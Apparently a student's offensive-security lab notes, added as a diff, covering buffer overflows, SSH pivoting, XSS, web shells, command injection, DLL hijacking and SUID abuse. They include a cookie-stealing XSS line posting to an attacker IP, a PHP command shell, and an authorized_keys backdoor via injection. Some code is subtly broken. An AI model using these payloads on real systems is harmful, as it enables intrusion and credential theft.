@@ -292,3 +292,867 @@ ls -la ../../.ssh/
 ssh www-data@ 
 ============================================================================================
 
+https://z3r0th.medium.com/a-simple-buffer-overflow-using-vulnserver-86b011eb673b
+step by step 
+
+static anal
+----------------
+strings 
+9999
+
+
+ file secureserverind.exe
+secureserverind.exe: PE32 executable (console) Intel 80386, for MS Windows
+
+dyna anal 
+_________________
+run the software
+
+
+
+windows powershell 
+netstat -antot 
+
+socket script 
+on linux 
+
+===============================================================================================
+#!/usr/bin/env python
+import socket
+
+buf = "TRUN /.:/" ##command to be sent
+
+buff += "A" * 5000 ##Data that should crash 
+
+s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) ## Creating socket, IPv4 TCP 
+
+s.connect(("192.168.65.10",9999)) ## Define the host and port 
+
+print s.recv(1024) ## print to screen the responce 
+
+s.send(buf) ## send the var buf 
+
+print s.recv(1024) ## print to the screen the responce 
+
+s.close() ##close the socket 
+
+==================================================================================================
+
+verify we can crash it ^^^^
+
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/?
+
+5000 
+
+paste field into script 
+
+run it 
+
+once you get the eip ie 386F4337
+
+paste it into the https://wiremask.eu/tools/buffer-overflow-pattern-generator/?
+
+gives you the offset length after you click away 
+
+now do a * 2003 or what ever number it returns 
+
+add the quad bs to make sure you are hitting the eip 
+=================================================================================================
+#!/usr/bin/env python
+import socket
+buf = "TRUN /.:/" ##command to be sent
+buf += "A" * 2003
+buf += "BBBB"
+s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) ## Creating socket, IPv4 TCP 
+s.connect(("192.168.65.10",9999)) ## Define the host and port 
+print s.recv(1024) ## print to screen the responce 
+s.send(buf) ## send the var buf 
+print s.recv(1024) ## print to the screen the responce 
+s.close() ##close the socket
+===============================================
+
+in the debugger window 
+!mona modules
+
+identify the module with ASLR set to false 
+
+!mona jmp -r esp -m "essfunc.dll"
+
+winow log data 
+
+
+625012A0
+============================================================================================
+
+tunnnel
+ssh -MS /tmp/jump student@10.50.xx.xx
+
+dynamic forward 
+ssh -S /tmp/jump jump -O forward -D 9050 
+
+ping sweep 
+find blah
+nmap blah found 22 open 
+
+port forward 
+ssh -S /tmp/jump jump - O forward -L1212:blah:22
+
+scp == source destination
+
+scp a local file and put it on a remote host 
+scp -P 1212 file.sh student@127.0.0.1:/home/student2/documents
+
+
+
+scp a file and pull it from a remote host !!! still excuted on the linops 
+scp -P 1212 student@127.0.0.1:home/student2/Documents/script.sh .
+
+same bu winders 
+
+scp -P 1212 file.sh student@127.0.0.1:C:/users/student/desktop
+
+
+scp -P 1212 student@127.0.0.1:C:/users/student/desktop/script.sh .
+
+
+PORT     STATE SERVICE
+80/tcp   open  http
+514/tcp  open  shell
+3201/tcp open  cpq-tasksmart
+============================================================================================
+
+192.168.28.96/27 network has the ability to communicate with the 192.168.150.224/27 network.
+Scan target networks to gather pertinent host information.
+
+>Jump Box
+->Network scan: 192.168.28.96/27
+-->Network scan:192.168.150.224/27
+
+
+Target Section:
+
+Network scans:
+Network: 192.168.28.96/27
+
+Network:192.168.150.224/27
+
+OSs: unknown
+Creds: student ::
+Known Ports: unknown
+Known URL: consulting.site.donovia
+Known URL: conference.site.donovia
+Action:  collect intelligence and identify possible avenues of approach in the network.
+=====================================================================================
+ftp--
+
+File Transfer Protocol (FTP) appears to be available within Donovian Cyberspace. Perform further reconnaissance and interrogate this service to identify the flag.
+
+Your flag will be a unique string of twenty random characters.
+
+ proxychains nc 192.168.28.105 21
+
+proxychains wget -r ftp://192.168.28.105
+    Logging in as anonymous ... Logged in!
+
+proxychains ftp 192.168.28.105 
+    Name (192.168.28.105:student): anonymous
+ help
+Commands may be abbreviated.  Commands are:
+
+!		dir		mdelete		qc		site
+$		disconnect	mdir		sendport	size
+account		exit		mget		put		status
+append		form		mkdir		pwd		struct
+ascii		get		mls		quit		system
+bell		glob		mode		quote		sunique
+binary		hash		modtime		recv		tenex
+bye		help		mput		reget		tick
+case		idle		newer		rstatus		trace
+cd		image		nmap		rhelp		type
+cdup		ipany		nlist		rename		user
+chmod		ipv4		ntrans		reset		umask
+close		ipv6		open		restart		verbose
+cr		lcd		prompt		rmdir		?
+delete		ls		passive		runique
+debug		macdef		proxy		send
+
+
+
+
+---------------------------------------------------------------------------
+
+Key Speaker--
+
+Intelligence shows that the Donovian Government is preparing for a conference, you have been tasked to collect all information relating to the speakers.
+
+Identify the key individual to find the flag
+
+Your flag will be a unique string of twenty random characters.
+
+-----------------------------
+
+STRONG tags
+
+There is some STRONG text within the Donovian Conference News that needs to be collected. It will provide the flag to our operations.
+
+Your flag will be a unique string of twenty random characters.
+right click element 
+ctrl f strong 
+f1rstpArt@<strong>i4BT2
+-------------------------------------------
+
+Contact Info--
+
+Intelligence suggests that the Donovian Consulting Group appears to have sensitive contacts available on their public facing site. Scrape the data and piece together the flag.
+
+Your flag will be a unique string of twenty random characters.
+justoeumetus
+----------------------------------------------------
+
+Company Article--
+
+A company has posted an article to Donovian Consulting Groups blog, Identify the flag associated with the company.
+
+Your flag will be a unique string of twenty random characters.
+
+---------------------------------------------------------------------
+
+SMB--
+
+Your team has received intelligence related to Server Message Block being available. Identify the host and associated flag.
+
+Your flag will be a unique string of twenty random characters.
+You will need to gain initial access to a system in 192.168.28.96/27 subnet utilizing passwords gathered through recon.
+--script
+
+----------------------------------------------------------
+
+TITLE tags-- 
+
+Find the Titles of all the hosted web servers, and identify the flag.
+
+Your flag will be a unique string of twenty random characters.
+==========================================================================================
+
+ssh to jumpbox 
+pingsweep the new network
+build dynamic to jump box :: ssh -S /tmp/jump jump -O forward -D 9050
+scan hosts and network and banner grab 
+
+proxychains nmap --script http-enum 10.100.28.55
+
+=====================================================================================
+
+## web-exploitation.html ##  ## BURP SWEEP??? ##
+----------------------------------------------------------
+*slide deck notes*
+
+Server/Client Relationship
+Synchronous communications between user and services
+
+Not all data is not returned, client only receives what is allowed 
+
+Request/Response:: Various tools to view:: tcpdump  wireshark  Developer Console
+
+HTTP Methods:: A Select Few: GET POST HEAD PUT  https://tools.ietf.org/html/rfc2616
+
+HTTP Fields:: User-Agent  Referer  Cookie  Date  Server  Set-Cookie
+
+http://10.50.x.x/path/pathdemo.php?myfile=demo1 <<< change 1 to another number to interact with the webpage 
+
+Wget 
+-------
+wget -r -l2 -P /tmp ftp://ftpserver/
+
+wget --save-cookies cookies.txt --keep-session-cookies --post-data 'user=1&password=2' https://website
+
+wget --load-cookies cookies.txt -p https://website/interesting/article.php
+
+curl 
+----
+Supports more protocols vs Wget, such as SCP & POP3
+
+curl 'https://web.site/submit.php' -H 'Cookie: name=123; settings=1,2,3,4,5,6,7' --data 'name=Stan' | base64 -d > item.png
+
+
+JavaScript (JS)
+---------------------
+Coded as .JS files, or in-line of HTML
+
+<script>
+function myFunction() {
+    document.getElementById("demo").innerHTML = "Paragraph changed.";
+}
+</script>
+
+<script src="https://www.w3schools.com/js/myScript1.js"></script>
+
+
+Enumeration
+--------------------------
+ROBOTS.TXT  Legitimate surfing 
+
+Tools:: NSE scripts  Nikto  Burp suite (outside class)
+
+**/var/www/html ** how many directories start here 
+
+
+Cross-Site Scripting (XSS) Overview
+-------------------------------------
+Insertion of arbitrary code into a webpage, that executes in the browser of visitors
+
+Unsanitized GET, POST, and PUT methods allow JS to be placed on websites
+
+Often found in forums that allow HTML
+
+Reflected XSS
+-------------------
+Below is what you see, but the server will decode as name=abc123
+http://example.com/page.php?name=dXNlcjEyMw
+
+
+Stored XSS
+-----------------------
+<img src="http://invalid" onerror="window.open('http://10.50.XX.XX:8000/ram.png','xss','height=1,width=1');">
+
+
+Useful JavaScript Components
+------------------------------
+<script>alert('XSS');</script>
+
+## python3 -m http.server ##
+
+this creates a hole for information to go into when i inject the below script 
+
+## <script>document.location="http://10.50.29.68:8000/"+document.cookie;</script> ##
+
+^^^^^ input this into a body function ^^^^
+
+Capturing Cookies
+
+document.cookie
+
+Capturing Keystrokes
+
+bind KEYDOWN and KEYUP
+
+Capturing Sensitive Data
+
+document.body.innerHTML
+
+use this then 
+
+take the cookie and put it here 
+
+
+Capturing Cookies :: document.cookie
+
+========================================================================================
+
+Minstry of Industry web servers
+
+Development of SSH access on host
+
+Donovian_MI_websvr.
+
+Jump Box
+for i in {1..255}; do (ping -c 1 10.100.28.$i | grep "bytes from" &); done
+64 bytes from 10.100.28.33: icmp_seq=1 ttl=64 time=2.58 ms
+64 bytes from 10.100.28.34: icmp_seq=1 ttl=63 time=1.74 ms
+64 bytes from 10.100.28.35: icmp_seq=1 ttl=63 time=1.44 ms
+64 bytes from 10.100.28.40: icmp_seq=1 ttl=63 time=0.948 ms
+64 bytes from 10.100.28.48: icmp_seq=1 ttl=63 time=9.72 ms
+
+->T1:10.100.28.40
+
+T1
+Hostname: Donovian_MI_websvr
+IP: 10.100.28.40
+4444/tcp open  krb524 ssh 
+nc 80 == http 
+| http-enum: 
+|   /robots.txt: Robots file
+|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
+
+/uploads/: 
+|
+Just completed my Cyber Awareness training and it says ATOPIA. Last I checked that is a whole other country.
+Please send me a corrected cert with the right now.
+
+I took my online training from the following website 10.100.28.55
+|
+
+www-data:x:33:33:www-data:/var/www:/bin/bash
+billybob:x:1001:1001:you found me jJxf2128HRwh0wqHujXM:/home/billybob:/bin/bash
+10.100.28.33
+Host is up (0.00047s latency).
+All 1000 scanned ports on 10.100.28.33 are closed
+
+Nmap scan report for 10.100.28.34
+Host is up (0.00068s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE
+53/tcp open  domain
+
+Nmap scan report for 10.100.28.35
+Host is up (0.00067s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE
+53/tcp open  domain
+
+Nmap scan report for 10.100.28.40
+Host is up (0.00055s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE
+80/tcp   open  http
+4444/tcp open  krb524
+
+Nmap scan report for 10.100.28.48
+Host is up (0.00062s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE
+80/tcp   open  http
+4444/tcp open  krb524
+
+Nmap done: 5 IP addresses (5 hosts up) scanned in 3.35 seconds
+OS: unknown
+Creds:unknown
+Last Known SSH Port: unknown
+PSP: Unknown
+Malware: Unknown
+Action: Conduct approved Web Exploitation techniques to collect intellegence.
+=============================================================================================
+
+### Directory Traversal/Path Traversal
+### Ability to read/execute outside web server’s directory
+### Uses ../../ (relative paths) in manipulating a server-side file path
+### view_image.php?file=../../etc/passwd
+ 
+../../../../../../../../../../../../../../etc/passwd ### you just put a bunch so you get back to the top 
+### you can do this with any file ie /etc/host 
+###
+### ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ post method 
+### change the url is considered the get method 
+### try all of the input feilds as only som may be considered misconfigured 
+===========================================================================================
+
+                  # Reverse Engineering / ctf #
+
+X86_64 Assembly - Common Instruction Pointers
+read these as command then right to left 
+PUSH // POP == change the stack pointer pop 1 lower push 1 higher by bit size ie ip eip 
+
+ADD: Add source to destination :: make sure to say store the new value 
+
+
+X86_64 Assembly - Common Terms
+
+HEAP
+Memory that can be allocated and deallocated
+
+STACK
+A contiguous section of memory used for passing arguments
+
+GENERAL REGISTER
+A multipurpose register that can be used by either programmer or user to store data or a memory location address
+
+CONTROL REGISTER
+A processor register that changes or controls the behavior of a CPU
+
+FLAGS REGISTER
+Contains the current state of the processor
+
+---------------------------------------------------------------------------
+# Instruction Pointers; holds address for next instruction to be executed
+			
+RIP 64-Bit Instruction Pointer
+
+EIP Lower 32 bits Instruction Pointer
+
+IP Lower 16 bits Instruction Pointer
+----------------------------------------------------------------------------
+
+X86_64 Assembly - Common Instruction Pointers
+MOV
+move source to destination
+
+PUSH
+push source onto stack
+
+POP
+Pop top of stack to destination
+
+INC
+Increment source by 1
+
+DEC
+Decrement source by 1
+
+ADD
+Add source to destination
+
+SUB
+Subtract source from destination
+
+CMP
+Compare 2 values by subtracting them and setting the %RFLAGS register. 
+ZeroFlag set means they are the same.
+
+JMP
+Jump to specified location :: no cmpr 
+
+JLE
+Jump if less than or equal :: if zero flag set set less than or equal 
+
+JE
+Jump if equal :: jmp if zero set to equal 
+
+========================================================================================
+
+DLL Search Order
+Executables check the following locations (in successive order):
+
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
+
+The directory the the Application was run from<--------------------------------------------WE TARGET THIS ONE 
+
+The directory specified in in the C+ function GetSystemDirectory()
+
+The directory specified in the C+ function GetWindowsDirectory()
+
+The current directory
+----------------------------------------------------------------------------------------------------------------break 
+
+look for a scheduled task or service that we can write to the directory // or applications running from a diffrent than normal directory // public flder // downloads // users dirrectory 
+
+looking for known voulnerabilities 
+type services in the search bar look at all services 
+
+command to get sysinternals 
+net use z: "\\http://live.sysinternals.com" /persistent:yes
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+when checking for user services look for user descreption tab gveaways 
+
+=============================================================================
+
+check to see if you can write to the cirectory, right click new 
+
+(get-process | ?{$_.name -like "putty"}).kill()
+
+ msfvenom -p windows/exec CMD=' cmd.exe /C "whoami" > C:\users\student\Desktop\whoami.txt -f dll > SSPICLI.dll
+
+------------------------------------------------------------------------------------------------------------------------
+
+if you cant rename the file then you have to do the above method 
+
+if you right click the file and you can ename it you cn hijack the exe
+
+rename the original to backup so you dont overwrite it 
+
+use the gui to find the tasks 
+
+=================================================================================================================================
+DEMO: Audit Logging
+Show all audit category settings
+auditpol /get /category:*
+What does the below command show?
+auditpol /get /category:* | findstr /i "success failure"
+
+
+10.50.21.129
+
+============================================================================================
+
+suid bit
+find / -type f -perm /4000 -ls 2>/dev/null
+path statement shows you where the command is looked for and excuted from 
+./ tells the machine to excute from the home dir 
+sgid bit 
+find / -type f -perm /2000 -ls 2>/dev/null
+
+both sgid and suid 
+find / -type f -perm /6000 -ls 2>/dev/null
+
+echo $PATH
+does it have a dot 
+PATH=.:/(the originial oathstatement 
+
+=============================================================================================
+
+Post Exploitation
+vim something.py is my win exploit script 
+
+Jump Box
+->T1: 192.168.28.100
+-->T3:x.x.x.9
+
+Target Section:
+
+T1
+Hostname: Donovian_Extranet
+IP: 192.168.28.100
+OS: CentOS
+Creds:Unknown
+Last Known SSH Port: 2222
+PSP: none
+Malware: none
+Action: Perform SSH masquerade and survey system. Identify redirection to the next target.
+
+T3
+Hostname: unknown
+IP: x.x.x.9
+OS: unknown
+Creds:unknown
+Last Known SSH Port: unknown
+PSP: Unknown
+Malware: Unknown
+Action: Gain access; survey host and map Donovian internal Cyberspace.
+
+ssh -S /tmp/jump jump -O forward  -L 1111:192.168.28.100:80 -L 2222:192.168.100:2222 -L 3333:192.168.28.111:80 -L 5555:192.168.28.111:2222 -L 2327:192.168.28.111:8080
+
+inet 192.168.28.100/27
+192.168.28.99
+192.168.28.97
+
+
+192.168.150.253
+
+StudentMidwayPassword
+
+============================================================================================
+
+### Site allows unsanitized file uploads
+
+#Server doesn’t validate extension or size
+#Allows for code execution (shell)
+#Once uploaded
+#Find your file
+#Call your file
+#^^^^^^^^^ you need all 3 
+
+#go to the webserver + robots and find the uploads folder 
+### The default user for an Apache web server is typically called "www-data" on Debian-based systems like Ubuntu, and "apache" 
+### on RedHat-based systems like CentOS, which is a dedicated system user account with limited permissions specifically designed to run the Apache web server process.
+
+"""
+<HTML><BODY>
+  <FORM METHOD="GET" NAME="myform" ACTION="">
+  <INPUT TYPE="text" NAME="cmd">
+  <INPUT TYPE="submit" VALUE="Send">
+  </FORM>
+  <pre>
+  <?php
+  if($_GET['cmd']) {
+    system($_GET['cmd']);
+    }
+  ?>
+  </pre>
+  </BODY></HTML>
+"""
+
+### website/(where ever uploads go)/your script 
+
+============================================================================================
+
+### Application on the server is vulnerable,
+### allowing execution of arbitrary commands
+### User input not validated
+### Common example is a SOHO router, with a web page to allow ping
+SPECIFY ABSOLUTE PATH EVERYTIME WHILE DOING THIS DO NOT CD 
+system("ping -c 1 ".$_GET["ip"]);
+###  ^^^contain the following in it’s code
+HOW DID WE GET TO THE COMMAND INJECTION ??!!?? we used the robots.txt 
+ALWAYS TRY ; whoami 
+
+### Run the following to chain/stack our arbitrary command
+; cat /etc/passwd
+
+
+### find the user you are currently 
+
+pwd 
+ls -al
+
+### RSA tokens are hardware devices or software applications that generate a unique code to authenticate a user's access to a network service, server, VPN, or email
+
+; mkdir /var/www/.ssh 
+
+### bellow is done from terminal 
+
+ls -al 
+
+ls ../../../../../../..s
+ssh-keygen -t rsa -b 4096 ### if your ssh file is empty when it asks you for a password just hit enter 
+
+cat ../../.ssh/id_rsa.pub
+ ## copy the contents ##
+ls -la ../../.ssh/
+
+
+##back to the command injection site 
+
+; echo "(paste ==student@lin-ops)">>/var/www/.ssh/authorized_keys ##not the actual conents drop everything between the () in stead us the past content 
+
+### attempt to ssh to the webserver 
+
+ssh www-data@ 
+
+=========================================================================================
+
+# Buffer Overflow DEFENSES
+-  Non executable (NX) stack: a defense ttactic against :: BO
+
+- Address Space Layout Randomization (ASLR) :: we have a script for this tomorrow 
+
+- Data Execution Prevention (DEP)
+- Stack Canaries
+- Position Independent Executable (PIE)
+--------------------------------------------------------------------------
+
+
+# GDB Uses
+instal :: git clone https://github.com/longld/peda.git ~/peda
+install :: echo "source ~/peda/peda.py" >> ~/.gdbinit
+
+Common Commands
+walkthrough :: disass <FUNCTION>   #   Disassemble portion of the program
+info <...>  #   Supply info for specific stack areas
+x/256c $<REGISTER>  #   Read characters from specific register
+break <address>  #   Establish a break point
+
+------------------------------------------------------------
+CAN WE PUT FILES IN???
+  GETS // PUTS 
+chmod 
+gdb func 
+  run 
+  quit 
+ run <<< $(python test.py) //
+
+       
+this is clearing the buffer :: 0x5655557b <+4>:	sub    esp,0x44
+  we overflow it 
+  
+buffer = "A" * 62
+eip = ("bbbb")
+print(buffer + eip)
+
+
+env - gdb func :: set eniv var 
+  show env 
+  now we remove the variables 
+unset env XXX
+  crash it (type RUN) 
+  overflow it with AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+  LOOK FOR :: Program received signal SIGSEGV, Segmentation fault.
+  info proc map (LOOKING FOR FIRST/LAST COLUMN VALUE FOR HEAP) 
+
+  start at the bottom of the heap and go down 
+  find /b 0x
+  find /b 0xf7de1000 , 0xf7ffd000, start and finish searching 
+  0xff, 0xe4 this is jump 
+
+  find /b 0xf7de1000 , 0xf7ffd000, 0xff, 0xe4
+
+  get the first three and put them in the script 
+
+  0xf7de3b59
+0xf7f588ab
+0xf7f645fb
+
+buffer = "A" * 62
+# eip = ("bbbb")  
+eip = ("bbbb")
+#0xf7de3b59 "\xf7\xde\x3b\x59" "\x59\x3b\xde\f7"
+#0xf7f588ab "\xab\x88\xf5\xf7"
+#0xf7f645fb "\xfb\x45\xf6\xf7" 
+
+print(buffer + eip)
+
+
+buffer = "A" * 62
+# eip = ("bbbb")
+eip = "\x59\x3b\xde\f7"
+#0xf7de3b59 "\xf7\xde\x3b\x59" "\x59\x3b\xde\f7"
+#0xf7f588ab "\xab\x88\xf5\xf7"
+#0xf7f645fb "\xfb\x45\xf6\xf7" 
+nop = '\x90' * 5
+print(buffer + eip)
+
+ ### after changing this and inputing my program didnt break and i lost it here use 
+
+
+  msfconsole :: 
+-------------------------------------------------
+use payload/linux/x86/exec
+  show options
+set CMD W
+generate -b "\x00" -f python
+ ------------------------------------------------
+
+#trying it myself 
+
+  chmod the file 
+  gdb (the file) run 
+  see what happens 
+  gdb :: pdisass (look for vulnerabilities)
+  look for a volunerabil function fgets ets you put files in 
+  gets lets user input 
+  gdb :: disass main 
+  gdb :: disass functions 
+  gdb :: disass gets /puts 
+  look for sub esp 	:: sub    esp,0x1c == place to start buffer overflow 68 A 
+  incriment by one to overflow
+  
+vim exploit.py
+---------------------------------------  
+buffer = "A" * 76
+eip = ("bbbb")
+shellcode = (buffer + eip)
+---------------------------------------
+ until the eip has my 4 bbbb 
+  
+FROM A BOX 
+  LINOPS:: env - gdb (THEPROGRAM) 
+show env 
+  now we remove the variables 
+unset env XXX
+  crash it (type RUN) 
+  overflow it with AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+  LOOK FOR :: Program received signal SIGSEGV, Segmentation fault.
+  info proc map (LOOKING FOR FIRST/LAST COLUMN VALUE FOR HEAP) 
+  find /b 0xf7de1000 , 0xf7ffd000, 0xff, 0xe4
+
+  PICK THE TOP 3 RETURNS 
+  0xf7de3b59
+0xf7f588ab
+0xf7f645fb
+0xf7f6460f
+
+  INTO THE SCRIPT :: 
+  eip = "\x59\x3b\xde\f7"
+#0xf7de3b59 "\xf7\xde\x3b\x59" "\x59\x3b\xde\f7"
+#0xf7f588ab "\xab\x88\xf5\xf7"
+#0xf7f645fb "\xfb\x45\xf6\xf7" 
+nop = '\x90' * 5
+
+  COMMENT OUT THE PREVIOUS EIP 
+
+ msfconsole :: 
+-------------------------------------------------
+use payload/linux/x86/exec
+  show options
+set CMD W
+generate -b "\x00" -f python
+ ------------------------------------------------
+  
+find /b 0xf7def000, 0xffffe000, 0xff, 0xe4
+0xf7df1b51
+0xf7f6674b
+0xf7f72753
+  
+
+
+
